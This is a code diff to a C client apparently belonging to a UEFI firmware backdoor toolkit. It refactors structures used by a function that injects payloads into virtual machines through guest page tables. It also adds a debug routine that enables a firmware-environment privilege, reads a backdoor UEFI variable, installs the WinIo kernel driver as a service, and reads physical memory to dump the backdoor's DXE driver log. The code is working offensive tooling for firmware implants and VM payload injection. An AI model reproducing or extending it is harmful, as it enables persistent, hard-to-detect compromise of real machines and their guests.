@@ -41,6 +41,48 @@ typedef struct _IDT_ENTRY
 
 #pragma pack()
 
+#define PROCESSOR_START_BLOCK_ADDR 0x1000
+
+#pragma pack(push, 2)
+
+typedef struct _FAR_JMP_16
+{
+    uint8_t OpCode;  // = 0xe9
+    uint16_t Offset;
+
+} FAR_JMP_16;
+
+typedef struct _PSEUDO_DESCRIPTOR_32
+{
+    uint16_t Limit;
+    uint32_t Base;
+
+} PSEUDO_DESCRIPTOR_32;
+
+#pragma pack(pop)
+
+typedef struct _PROCESSOR_START_BLOCK *PPROCESSOR_START_BLOCK;
+typedef struct _PROCESSOR_START_BLOCK
+{
+    // The block starts with a jmp instruction to the end of the block
+    FAR_JMP_16 Jmp;
+
+    // Completion flag is set to non-zero when the target processor has
+    // started
+    uint32_t CompletionFlag;
+
+    // Pseudo descriptors for GDT and IDT
+    PSEUDO_DESCRIPTOR_32 Gdt32;
+    PSEUDO_DESCRIPTOR_32 Idt32;
+
+    // ...
+
+} PROCESSOR_START_BLOCK;
+
+// other fields offsets
+#define PROCESSOR_START_BLOCK_HalpLMStub    0x70
+#define PROCESSOR_START_BLOCK_Cr3           0xa0
+
 bool m_quiet = false;
 //--------------------------------------------------------------------------------------
 int backdoor_invalidate_caches(void)
@@ -1380,45 +1422,6 @@ int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
     return -1;
 }
 //--------------------------------------------------------------------------------------
-#pragma pack(push,2)
-
-typedef struct _FAR_JMP_16 
-{
-    uint8_t OpCode;  // = 0xe9
-    uint16_t Offset;
-
-} FAR_JMP_16;
-
-typedef struct _PSEUDO_DESCRIPTOR_32 
-{
-    uint16_t Limit;
-    uint32_t Base;
-
-} PSEUDO_DESCRIPTOR_32;
-
-#pragma pack(pop)
-
-typedef struct _PROCESSOR_START_BLOCK *PPROCESSOR_START_BLOCK;
-typedef struct _PROCESSOR_START_BLOCK 
-{
-    // The block starts with a jmp instruction to the end of the block
-    FAR_JMP_16 Jmp;
-
-    // Completion flag is set to non-zero when the target processor has
-    // started
-    uint32_t CompletionFlag;
-
-    // Pseudo descriptors for GDT and IDT
-    PSEUDO_DESCRIPTOR_32 Gdt32;
-    PSEUDO_DESCRIPTOR_32 Idt32;
-
-    // ...
-
-} PROCESSOR_START_BLOCK;
-
-#define PROCESSOR_START_BLOCK_HalpLMStub    0x70
-#define PROCESSOR_START_BLOCK_Cr3           0xa0
-
 int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_size)
 {
     int ret = 0;
@@ -1428,7 +1431,7 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
     printf("[+] Guest EPT at 0x%.16llx\n", pml4_addr);
 
     // get host physical address of PROCESSOR_START_BLOCK
-    if (backdoor_phys_translate(0x1000, &phys_addr, pml4_addr) != 0)
+    if (backdoor_phys_translate(PROCESSOR_START_BLOCK_ADDR, &phys_addr, pml4_addr) != 0)
     {
         return -1;
     }
@@ -2065,12 +2068,181 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
+int load_privileges(char *name)
+{
+    int ret = -1;
+    HANDLE token = NULL;    
+    TOKEN_PRIVILEGES privs;
+    LUID val;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
+    {
+        printf("OpenProcessToken() ERROR %d\n", GetLastError());
+        goto _end;
+    }
+
+    if (!LookupPrivilegeValueA(NULL, name, &val))
+    {
+        printf("LookupPrivilegeValue() ERROR %d\n", GetLastError());
+        goto _end;
+    }
+
+    privs.PrivilegeCount = 1;
+    privs.Privileges[0].Luid = val;
+    privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(token, FALSE, &privs, sizeof (privs), NULL, NULL))
+    {
+        printf("AdjustTokenPrivileges() ERROR %d\n", GetLastError());
+        goto _end;
+    }
+
+    ret = 0;
+
+_end:
+
+    if (token)
+    {
+        CloseHandle(token);
+    }
+
+    return ret;
+}
+//--------------------------------------------------------------------------------------
+int backdoor_read_debug_messages(void)
+{    
+    int ret = -1;    
+    wchar_t *var_name = BACKDOOR_VAR_NAME, var_guid[MAX_PATH];
+    GUID guid = BACKDOOR_VAR_GUID;
+    uint64_t address = 0;
+
+    swprintf(
+        var_guid, L"{%.8x-%.4x-%.4x-%.2x%.2x-%.2x%.2x%.2x%.2x%.2x%.2x}",
+        guid.Data1, guid.Data2, guid.Data3,
+        guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
+        guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]
+    );
+
+    // obtain needed privileges
+    if (load_privileges(SE_SYSTEM_ENVIRONMENT_NAME) != 0)
+    {
+        printf("ERROR: Unable to obtain %s privilege\n", SE_SYSTEM_ENVIRONMENT_NAME);
+        return -1;
+    }
+
+    printf("[+] Reading firmware variable %ws %ws\n", var_name, var_guid);
+
+    // get debug messages buffer address
+    if (GetFirmwareEnvironmentVariableW(var_name, var_guid, (void *)&address, sizeof(address)) != sizeof(address))
+    {
+        printf("GetFirmwareEnvironmentVariable() ERROR %d\n", GetLastError());
+        printf("ERROR: Unable to get debug messages buffer address\n");
+        return -1;
+    }    
+
+    char driver_path[MAX_PATH];
+    char *driver_name = WINIO_DRIVER_NAME, *device_path = WINIO_DEVICE_PATH;
+
+    GetSystemDirectory(driver_path, MAX_PATH);
+    strcat_s(driver_path, "\\drivers\\");
+    strcat_s(driver_path, driver_name);
+
+    // copy driver into the system folder
+    if (!CopyFile(driver_name, driver_path, FALSE))
+    {
+        printf("CopyFile() ERROR %d\n", GetLastError());
+        printf("ERROR: Unable to copy \"%s\" into the \"%s\"\n", driver_name, driver_path);
+        return -1;
+    }
+
+    bool already_started = FALSE, stop = FALSE;
+
+    printf("[+] Loading WinIo driver...\n");
+
+    HANDLE fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (fd == INVALID_HANDLE_VALUE)
+    {
+        // create and start service
+        if (service_start(WINIO_SERVICE_NAME, driver_path, &already_started))
+        {
+            stop = !already_started;
+
+            printf("[+] WinIo driver was loaded\n");
+
+            // open driver device
+            fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+            if (fd == INVALID_HANDLE_VALUE)
+            {
+                printf("CreateFile() ERROR %d\n", GetLastError());
+                printf("ERROR: Unable to open \"%s\"\n", device_path);
+                goto _end;
+            }
+        }
+        else
+        {
+            printf("ERROR: Unable to load WinIo driver\n");
+            goto _end;
+        }
+    }    
+    else
+    {
+        printf("[+] WinIo driver is already loaded\n");
+    }
+
+    if (fd != INVALID_HANDLE_VALUE)
+    {   
+        char *buff = (char *)malloc(DEBUG_OUTPUT_SIZE);
+        if (buff)
+        {
+            memset(buff, 0, DEBUG_OUTPUT_SIZE);
+
+            printf("[+] Reading physical memory at 0x%llx\n", address);
+
+            // read debug messages buffer 
+            if (winio_phys_mem_read(fd, address, DEBUG_OUTPUT_SIZE, buff) == 0)
+            {
+                // print debug messages to the screen
+                printf("\n%s\n", buff);
+
+                ret = 0;
+            }
+            else
+            {
+                printf("ERROR: Unable to read debug messages buffer\n");
+            }
+
+            free(buff);
+        }
+
+        CloseHandle(fd);
+    }
+
+_end:
+
+    if (stop)
+    {
+        // stop and delete service
+        service_stop(WINIO_SERVICE_NAME);
+        service_remove(WINIO_SERVICE_NAME);
+    }
+
+    DeleteFile(driver_path);
+
+    return ret;
+}
+//--------------------------------------------------------------------------------------
 int _tmain(int argc, _TCHAR* argv[])
 {
     uint32_t cpu = 0;
 
     SYSTEM_INFO sys_info;
     GetSystemInfo(&sys_info);    
+
+    if (argc >= 2 && !strcmp(argv[1], "--debug"))
+    {
+        // readd and print backdoor DXE driver debug messages buffer
+        return backdoor_read_debug_messages();
+    }
 
     if (argc >= 2)
     {
